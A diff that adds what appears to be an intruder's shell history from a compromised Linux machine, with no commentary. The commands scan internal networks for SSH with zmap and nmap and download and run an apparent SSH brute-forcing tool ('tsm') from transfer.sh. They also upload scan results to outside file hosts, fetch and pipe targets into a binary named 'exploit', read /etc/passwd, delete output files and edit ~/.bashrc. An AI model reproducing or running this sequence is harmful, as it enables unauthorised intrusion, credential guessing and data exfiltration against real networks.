@@ -1,0 +1,111 @@
+cat out.txt | ./exploit 
+cat done.txt 
+ssh admin@10.208.10.215
+ssh admin@10.208.10.198
+ssh admin@10.208.7.123
+ssh admin@10.208.5.235
+ls
+nano combo.txt 
+ls
+cat out.txt | ./exploit 
+ls
+nano combo.txt 
+ls
+cat out.txt | ./exploit 
+nano list.txt
+ls
+nmap -sV -iL list.txt -vv
+apt-get install nmap -y
+nmap -sV -iL list.txt -vv
+ssh aluno@10.208.8.238
+ls
+cat list.txt 
+zmap -iL list.txt -R
+zmap -iL list.txt --system-dns 
+zmap -iL list.txt -vv --system-dns 
+zmap -iL list.txt -sV --system-dns 
+nmap
+nmap -iL list.txt  -R
+nmap -iL list.txt -vv -p 80 -R
+nmap -iL list.txt -vv -p 80 --system-dns
+nano /etc/resolv.conf 
+ls
+nmap -iL list.txt -vv -p 80 --system-dns
+nmap -sV 10.208.200.95 -vv
+nmap -sV -iL list.txt -vv -p 80
+cat /etc/passwd
+ls
+wget https://transfer.sh/MeEXa/tsm.tar
+tar -xvf tsm.tar 
+ls
+chmod +x tsm
+./tsm
+nano p
+ls
+./tsm -t 300 
+./tsm -t 300 -s 10 -S 10 -P 0 -p 22 p out.txt 
+ls
+cat v
+ls
+nano p
+ls
+nano tsm
+ls
+./tsm -t 300 -s 10 -S 10 -P 0 -p 22 p out.txt 
+ls
+cat v
+nano p
+ls
+./tsm -t 300 -s 10 -S 10 -P 0 -p 22 p out.txt 
+cat v
+ping 192.168.1.1
+ping 192.168.0.1
+zmap -p 22 192.168.0.0/16 -o out2.txt -B1M
+nano /etc/zmap/blacklist.conf
+ls
+zmap -p 22 192.168.0.0/16 -o out2.txt -B1M
+zmap -p 22 10.0.0.0/16 -o out2.txt -B1M
+zmap -p 22 10.0.0.0/8 -o out2.txt -B1M
+zmap -p 22 10.0.0.0/8 -o out2.txt -B10M
+bash
+ls
+ps -aux
+apt-get install zmap -y
+ps -aux
+w
+uptime
+last
+ls
+cat tmp.txt 
+ls
+cd /var/tmp
+ls
+ifconfig
+ls
+zmap -p 22 10.208.0.0/16 -o out.txt -B1M
+nano /etc/zmap/blacklist.conf
+ls
+zmap -p 22 10.208.0.0/16 -o out.txt -B1M
+ls
+cat out.txt 
+curl --upload-file ls
+curl --upload-file out.txt https://transfer.sh/
+curl --upload-file out.txt https://f.secretalgorithm.com/
+ls
+ifconfig
+cat /etc/passwd
+wget https://f.secretalgorithm.com/iWPzE/exploit
+chmod +x exploit 
+nano combo.txt
+ls
+chmod +x *
+cat out.txt | ./exploit 
+ls
+cat done.txt 
+rm -rf done.txt 
+nano ~/.bashrc
+ls
+bash bash
+bash
+
+
